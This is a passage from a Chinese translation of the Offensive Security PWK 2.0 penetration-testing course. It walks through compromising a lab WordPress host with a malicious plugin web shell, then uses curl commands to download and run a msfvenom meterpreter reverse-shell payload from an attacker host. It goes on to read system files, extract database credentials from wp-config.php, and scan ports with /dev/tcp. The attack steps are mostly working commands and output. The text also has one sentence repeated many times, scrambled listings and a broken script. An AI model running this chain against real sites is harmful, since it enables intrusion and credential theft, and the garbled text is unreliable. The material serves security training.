
如果在 HTTP 请求中设置了`cmd`变量，第 20-24 行将尝试运行系统命令。插件将使用`executeCommand`函数来识别并执行适当的 PHP 内部 API 以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。插件将使用`executeCommand`函数来识别并执行适当的 PHP 内部 API 以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

20-24 将尝试在 HTTP 请求中设置了`cmd`变量时运行系统命令。`executeCommand`函数可以在第 47-82 行找到以运行命令。

## 基于 Kali Linux 的渗透测试 2.0

基于基于 Kali Linux 的渗透测试 2.0

为了获取 shell，我们必须首先以 WordPress 能够处理的方式打包插件。生成的 zip 文件将被放在服务器的`wp-content/plugins`中。由于，我们需要记录 zip 文件的文件名。

> 你可能会收到一个验证管理员电子邮件的请求。如果是这样，你只需点击“此电子邮件是正确的”即可继续。

PWK 2.0 Copyright © Offensive Security Ltd. 版权所有。766

## 2.5 获取 Shell

生成的 zip 文件名为`plugin-shell.php`，并将位于`plugin-shell`文件夹中。

现在插件包已经生成，是时候上传 shell 了。首先，我们需要通过点击左侧边栏的“插件”链接访问插件页面。

图 334：访问插件页面

```
kali@kali:~ cd /usr/share/sectlists/Web-Shells/WordPress

kali@kali:/usr/share/sectlists/Web-Shells$ sudo zip plugin-shell.zip plugin-shell.php

adding: plugin-shell.php (deflated 58%)
```

列表 879 - 为 web shell 创建 zip 包

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_922_0.png)

PWK 2.0 版权所有 Offensive Security Ltd. 版权所有。772

最后，为了安装插件，我们点击*Install Now*。

*图338：安装插件*

安装插件将上传 zip 文件并解压内容。

现在插件已经安装，我们可以尝试使用它在 WordPress 目标机器上运行系统命令。如之前讨论过的，插件目录为`wp-content/plugins/`；zip 文件将解压到名为`plugin-shell`的目录中，我们的目标文件名为`plugin-shell.php`。

记住我们还必须设置一个*cmd*参数，其中包含我们尝试在目标系统上执行的命令。让我们尝试运行*whoami*看看 shell 是否正常工作。

列表 880 - 运行 whoami

成功了！根据列表 880 的输出，我们正在以`www-data`用户身份运行命令。现在是时候上传 metpreter 负载并获取一个完整的反向 shell 了。

使用 Kali Linux 2.0 进行渗透测试

# OFFENSIVE SECURITY

```
kali@kali:-$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
www-data
```

PWK 2.0 版权所有 Offensive Security Ltd. 版权所有。773

```
kali@kali:~ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf
```

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_924_0.png)

# 首先，让我们用`msfvenom`工具生成一个 meterpreter 负载。

列表 881 - 生成 meterpreter 负载

根据我们之前的枚举工作，我们选择了适用于 Ubuntu 的 Linux meterpreter 负载。`LHOST`选项将指向我们的 Kali IP 地址，我们选择 443 作为`LPORT`，试图规避出站防火墙规则。虽然始终检查任何出站过滤是一个良好习惯，但在这种情况下，我们假设端口 443 是未限制的。我们正在将负载生成为 elf 文件，并将输出重定向到 kali 用户家目录中名为`shell.elf`的文件中。

生成 meterpreter 反向 shell 后，我们启动一个 Web 服务器以允许目标机器下载 shell。

列表 882 - 在端口 80 上启动 Web 服务器

列表 882 中的 Web 服务器使用 Python 的`http.server`模块，被指示使用 80 端口，并从 kali 用户的家目录提供文件。我们再次选择了 80 端口，以避免在存在防火墙阻止出站端口时可能遇到的任何问题。

shell 已经生成且 Web 服务器正在运行，我们将指示目标从我们的 Kali 系统下载 shell。然而，我们必须将任何空格字符编码为"%20"，因为我们不能在 URL 中使用空格。我们正在运行的命令显示在列表 883。

列表 883 - 将 shell 下载到目标

如果命令执行成功，我们应该在 Python Web 服务器的日志中看到类似下面的条目。

列表 884 - 下载成功

成功！接下来我们需要让 shell 变为可执行，在 Kali 上启动一个 Metasploit 负载处理器，并在目标上运行该文件以获取 meterpreter shell。为了让 shell 可执行，我们将对它运行`chmod +x`。同样，我们需要记住对敏感字符进行 URL 编码，例如空格 (%20) 和"+" (%2b)。使 shell 可执行的命令显示在列表 885 中。

# 列表 885 - 让 shell 变为可执行

此时，shell 应该是可执行的。接下来，我们将在相应的接口和端口上启动 meterpreter 负载监听器。

```
kali@kali:~$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 ...
```

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_926_0.png)

```
kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf
```

```
Serving HTTP on 0.0.0.0 port 80 ...n10.11.1.250 - - [09/Dec/2019 19:40:16] "GET /shell.elf HTTP/1.1" 200 -
```

```
kali@kali:~$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
```

# 886 - 启动 metasploit

在上面的`msfconsole`命令中，我们让 Metasploit 静默启动 (-q)，并通过`-x`选项立即配置处理器，传递与我们生成 shell 时使用的相同的负载设置。随着我们的监听器运行，终于是获取反向 shell 的时候了。这可以通过通过我们安装的恶意插件执行`shell.elf`来。

列表 887 - 运行 shell

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_929_0.png)

```
kali@kali:-$ sudo msfconsole -q "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.11.0.4; set LPORT 443; run"

[*] Started TCP on 10.11.0.4
```

```
kali@kali:-$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf

[*] Sending stage (98520 bytes) to 10.11.1.250
[*] Meterpreter session 1 opened (10.11.0.4:443 -> 10.11.1.250:53768) at 19:54:41
meterpreter > shell Process 9629 created. Channel 1 created.

meterpreter > whoami
www-data

exit
```

列表 888 - reverse shell

现在我们在 WordPress 机器上获得了一个 shell，我们将进入渗透后。

# 24.2.6 渗透后

首先，让我们收集主机的一些基本信息，例如网络配置、主机名、操作系统版本等。

```
meterpreter > shell Process 6667 created. Channel 1 created.
```

```
ifconfig

ens30 enc=Ethernet HWaddr 00:56:8a:82:25:0 inet:10.4.4.10 mask:255.255.255.0 feaddr:ff:66:8a:285 Scope:64 BROADCAST MULTICAST MTU:1500 Metric:1
```

PWK 2.0 版权所有 Offensive Security Ltd. 版权所有。775

列表 889 - 收集基本信息

通过这些基本收集，我们了解到主机名为"Ajla"，IP 地址为 10.4.4.10，Linux 版本为 Ubuntu 16.04 4.4.0-21 kernel。这些信息将允许我们绘制网络脑图并在以后很有用。

图 39：包含 Ajla 的网络图

收集这些信息后，我们可以进行特定的枚举。由于我们知道目标正在运行 WordPress 并且发现数据库在另一个主机上，我们知道系统中某处应该数据库凭据。快速 Google 搜索显示`wp-config.php`文件是 WordPress 数据库配置的地方。查看此文件，我们发现了可能是我们的目标。

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_931_0.png)

```
RX packets:29154 errors:0 dropped:22 overruns:0 TX packets:176526 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueue:1000 RX bytes:8327519 (8.3 MB) TX bytes:13590061 (13.5 MB)
```

```
hostname

ajla

cat /etc/issue

Ubuntu 16.04 LTS

cat /proc/version

Linux version 4.4.0-21-generic (buildd+lg01-21) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2)) #37-Ubuntu SMP Apr 18 18:33:37 UTC 2016
```

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_931_1.png)

```
meterpreter > shell Process 9702 created. Channel 1 created.
```

```
pwd

/var/www/html/wp-content/plugins/plugin-shell

cd /var/www/html

ls -alh

...

-rw-r--r-- 1 www-data www-data 2.3K Jan 20 2019 wp-comments-post.php
```

PWK 2.0 版权所有 Offensive Security Ltd. 版权所有。776

列表 890 - 读取 wp_config.php

在`wp_config.php`文件中，我们发现数据库 IP 地址为 10.5.5.11。我们还发现了一个名为'user'的 MariaDB 数据库，该账户的密码为'Lv9EvVq886cf8ioWsqFUQYu'。为了继续，我们需要巩固我们的网络并创建一个稳定的跳转点

# 24.2.7 创建稳定的跳转点

在继续之前，让我们回顾一下我们目前拥有的。我们在 WordPress 机器上有一个作为`www-data`用户的 shell，并且通过 Ajla 拥有对数据库的网络访问权限。最后，我们刚刚发现了数据库凭据，我们知道它们是有效的，因为它们已经被 WordPress 应用程序使用。

到目前，我们知道网络应该像图 340 那样。

**图 340：** 数据库主机名未知的网络图

如果隧道的方向反了，那么动态端口转发将无用武之地。本地端口转发则可以让我们在 Kali 中打开一个指向 MariaDB 服务器的端口。然而，这要求我们知道内部目标上有哪些端口是处于开启状态。

首先，我们将通过 Nmap 检查是否可以简化端口扫描，但我们不应抱太大期望。

## 列表 891 - 检查 Nmap

如所料料，服务器上没有 Nmap，但无需担心。我们可以创建一个快速脚本来扫描该主机。

## 列表 892 - Bash 端口扫描

脚本的内容可以保存存在`portscan.sh`文件中。我们的脚本将遍历从 1 到 65535 的每个端口。对于每个端口，将建立一个超时时间为`.1`秒的连接，如果连接成功，脚本将回显哪个端口是开启的。

这个脚本快速且原始；但它应该能带给我们所需的信息。要运行该脚本，我们需要将其内容导出到文件中。一种快速的方法是使用 meterpreter 的`upload`命令。

使用 Kali Linux 2.0 进行渗透测试

![](img/dc318d3c28aa8a78cc9c5c8bcbf10f77_933_0.png)

```
nmap
```

```
/bin/sh: 1: nmap: not found
```

```bash
#!/bin/bash

host=10.5.5.11

for port in {1..65535}; do

timeout .1 -c 'echo >/dev/tcp/$host/$port' & &

echo "$port is open"

d

echo "Done"

done
```
